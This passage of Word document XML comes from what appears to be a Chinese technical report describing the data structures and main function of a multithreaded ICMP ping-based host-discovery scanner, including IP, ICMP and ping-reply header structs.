          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="00506368">
        <w:t>.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>所示</w:t>
      </w:r>
      <w:r w:rsidR="00FC790D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>existHostMap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>map &lt;string, int&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>类型的全局，</w:t>
      </w:r>
      <w:r w:rsidR="00921861">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>用于存储扫描结果。</w:t>
      </w:r>
      <w:r w:rsidR="00FC790D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如果主机存在，则将该记录存储在</w:t>
      </w:r>
      <w:r w:rsidR="00FC790D" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>existHostMap</w:t>
      </w:r>
      <w:r w:rsidR="00FC790D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中。string是扫描主机IP，int代表结果，值1为主机存在。</w:t>
      </w:r>
      <w:r w:rsidR="00F32CD2" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>sendICMPStruct</w:t>
      </w:r>
      <w:r w:rsidR="0099741D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为结构体，</w:t>
      </w:r>
      <w:r w:rsidR="0099741D" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0099741D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>用于向线程传递扫描的起始IP和终止IP。</w:t>
      </w:r>
      <w:r w:rsidR="00FC790D" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>IPHeader</w:t>
      </w:r>
      <w:r w:rsidR="00FC790D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为结构体，用于组件IP头</w:t>
      </w:r>
      <w:r w:rsidR="0099741D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidR="0099741D" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>pICMPHeader</w:t>
      </w:r>
      <w:r w:rsidR="0099741D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为结构体，用于组件ICMP头。</w:t>
      </w:r>
      <w:r w:rsidR="0099741D" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>PPingReply</w:t>
      </w:r>
      <w:r w:rsidR="0099741D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为结构图，用于组件解析ICMP响应报文。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="411153FC" w14:textId="3F7ABF87" w:rsidR="00D95F25" w:rsidRPr="0065605B" w:rsidRDefault="00D95F25" w:rsidP="00D95F25">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0065605B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">表 </w:t>
      </w:r>
      <w:r w:rsidR="00506368" w:rsidRPr="0065605B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="00506368" w:rsidRPr="0065605B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00EB3BDB" w:rsidRPr="0065605B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="0065605B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>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1896"/>
        <w:gridCol w:w="2736"/>
        <w:gridCol w:w="2196"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D95F25" w:rsidRPr="00E90326" w14:paraId="0490DE2F" w14:textId="77777777" w:rsidTr="00F32CD2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="50CFC030"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数据</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="4D0CE2E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类型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="0268ABB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介绍</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D95F25" w:rsidRPr="00E90326" w14:paraId="6A4F1E14" w14:textId="77777777" w:rsidTr="00F32CD2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="44A85BDC" w14:textId="39EDAAAD" w:rsidR="00D95F25" w:rsidRPr="00E90326" w:rsidRDefault="00D95F25" w:rsidP="007D3B90">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>existHostMap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="09D8ECE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map &lt;string, int&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="6204B9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存放主机扫描结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D95F25" w:rsidRPr="00E90326" w14:paraId="1A89F313" w14:textId="77777777" w:rsidTr="00F32CD2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="7841C685"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IPHeader</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="0E69D3AE"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IPHeader</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="0CEA7B54"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IP头部</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D95F25" w:rsidRPr="00E90326" w14:paraId="314451EA" w14:textId="77777777" w:rsidTr="00F32CD2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="393EE42A"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pICMPHeader</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="3CC3E4F1"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struct ICMPHeader</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="4232C88B"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hint="eastAsia"/>
              </w:rPr>
              <w:t>ICMP头部</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D95F25" w:rsidRPr="00E90326" w14:paraId="5689C223" w14:textId="77777777" w:rsidTr="00F32CD2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="25075A8C" w14:textId="77777777" w:rsidR="00D95F25" w:rsidRPr="00E90326" w:rsidRDefault="00D95F25" w:rsidP="007D3B90">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>pPingReply</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="26296CDA" w14:textId="77777777" w:rsidR="00D95F25" w:rsidRPr="00E90326" w:rsidRDefault="00D95F25" w:rsidP="007D3B90">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>struct PingReply</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="1E419F52" w14:textId="77777777" w:rsidR="00D95F25" w:rsidRPr="00E90326" w:rsidRDefault="00D95F25" w:rsidP="007D3B90">
            <w:pPr>
              <w:keepNext/>
              <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
              </w:rPr>
              <w:t>ICMP回复消息头部</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F32CD2" w:rsidRPr="00E90326" w14:paraId="600161DF" w14:textId="77777777" w:rsidTr="00030EC6">
        <w:trPr>
          <w:trHeight w:val="558"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="0804B2A7" w14:textId="49C86B78" w:rsidR="00F32CD2" w:rsidRPr="00E90326" w:rsidRDefault="00F32CD2" w:rsidP="007D3B90">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>sendICMPStruct</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="37465888" w14:textId="5898B73A" w:rsidR="00F32CD2" w:rsidRPr="00E90326" w:rsidRDefault="00F32CD2" w:rsidP="00F32CD2">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:afterLines="0" w:line="40" w:lineRule="atLeast"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>struct sendICMPStruct</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="20BF2529" w14:textId="10FE449A" w:rsidR="00F32CD2" w:rsidRPr="00E90326" w:rsidRDefault="00F32CD2" w:rsidP="007D3B90">
            <w:pPr>
              <w:keepNext/>
              <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
              </w:rPr>
              <w:t>起始IP和终止IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="18C0770E" w14:textId="77777777" w:rsidR="00F32CD2" w:rsidRDefault="00F32CD2" w:rsidP="00D95F25">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="40" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D8AF9F7" w14:textId="77777777" w:rsidR="00F32CD2" w:rsidRDefault="00F32CD2" w:rsidP="00D95F25">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="40" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44E7E418" w14:textId="77777777" w:rsidR="00F32CD2" w:rsidRDefault="00F32CD2" w:rsidP="00D95F25">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="40" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C47865B" w14:textId="77777777" w:rsidR="00F32CD2" w:rsidRDefault="00F32CD2" w:rsidP="00D95F25">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="40" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17555AF2" w14:textId="77777777" w:rsidR="00F32CD2" w:rsidRDefault="00F32CD2" w:rsidP="00D95F25">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="40" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30828024" w14:textId="77777777" w:rsidR="00F32CD2" w:rsidRDefault="00F32CD2" w:rsidP="00D95F25">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="40" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B3C70CC" w14:textId="77777777" w:rsidR="00F32CD2" w:rsidRDefault="00F32CD2" w:rsidP="00D95F25">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="40" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D488720" w14:textId="77777777" w:rsidR="00F32CD2" w:rsidRDefault="00F32CD2" w:rsidP="00D95F25">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="40" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="415A3B0C" w14:textId="77EF0EC9" w:rsidR="00F32CD2" w:rsidRDefault="00F32CD2" w:rsidP="00D95F25">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="40" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B6AA28A" w14:textId="2CDD5031" w:rsidR="00D95F25" w:rsidRPr="00E90326" w:rsidRDefault="00D95F25" w:rsidP="00D95F25">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="40" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>结构体：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44EA6FA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IPHeader</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70CB679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4652C01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6FA0D68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851CE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571DB1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3BEE2BC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B12AD9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BYTE m_byTTL; //TTL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569A3F1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767328E6"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3AF4EDB3"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614FC677"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4C7DA649"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0B611D4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lastRenderedPageBreak/>
        <w:t>struct ICMPHeader</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27AE0A8F"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AD7E5E4"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279B42C8"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0A5DBC2A"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4908520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5F3EB36C"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037625E2"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6697F4F0" w14:textId="77777777" w:rsidR="00D95F25" w:rsidRPr="00E90326" w:rsidRDefault="00D95F25" w:rsidP="00D95F25">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="40" w:lineRule="atLeast"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9C90F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struct PingReply</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07728EFB"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E3E3A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USHORT m_usSeq;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51A1B83D"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m_dwRoundTripTime;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4425E0F0"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m_dwBytes;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C333CC9" w14:textId="77777777" w:rsidR="00D95F25" w:rsidRPr="00E90326" w:rsidRDefault="00D95F25" w:rsidP="00D95F25">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="40" w:lineRule="atLeast"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:tab/>
        <w:t>DWORD m_dwTTL;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358FD25B" w14:textId="46953AC8" w:rsidR="00D95F25" w:rsidRDefault="00D95F25" w:rsidP="00E45AE7">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="40" w:lineRule="atLeast"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F91F7B"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struct sendICMPStruct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0839A228"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260E7E5F"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startScanIP;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1512D1F0" w14:textId="77777777" w:rsidR="00F32CD2" w:rsidRPr="00F32CD2" w:rsidRDefault="00F32CD2" w:rsidP="00F32CD2">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="40" w:lineRule="atLeast"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F32CD2">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:tab/>
        <w:t>int endIP;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65FCDAFA" w14:textId="0E0CAC59" w:rsidR="00F32CD2" w:rsidRPr="00E45AE7" w:rsidRDefault="00F32CD2" w:rsidP="00F32CD2">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="40" w:lineRule="atLeast"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F32CD2">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF95F5B" w14:textId="52BABC71" w:rsidR="00802D67" w:rsidRDefault="00300E84" w:rsidP="00802D67">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1074" w:name="_Toc482522636"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>主要函数</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1074"/>
    </w:p>
    <w:p w14:paraId="60DC20CD" w14:textId="402CF265" w:rsidR="00030EC6" w:rsidRPr="00EE5497" w:rsidRDefault="00EE5497" w:rsidP="00EE5497">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如表</w:t>
      </w:r>
      <w:r w:rsidR="004278A9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="004278A9">
        <w:t>.2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>所示，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>hostScan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数用于进行主机扫描，该函数需要传入</w:t>
      </w:r>
      <w:r w:rsidRPr="00F32CD2">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>sendICMPStruct</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>结构体作为参数，包括扫描的起始IP和结束IP。将扫描结果存入全局变量</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>existHostMap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中。每个扫描线程运行</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>hostScan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="017A7EA3" w14:textId="3AF5EBA6" w:rsidR="00EE5497" w:rsidRPr="00F05A40" w:rsidRDefault="00E45AE7" w:rsidP="00EE5497">
      <w:pPr>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表 </w:t>
      </w:r>
      <w:r w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="004278A9" w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.2</w:t>
      </w:r>
      <w:r w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>主机扫描主要函数信息</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af2"/>
        <w:tblW w:w="9493" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3336"/>
        <w:gridCol w:w="3910"/>
        <w:gridCol w:w="2247"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E45AE7" w:rsidRPr="00E90326" w14:paraId="4A0A892D" w14:textId="77777777" w:rsidTr="007D3B90">
        <w:tc>
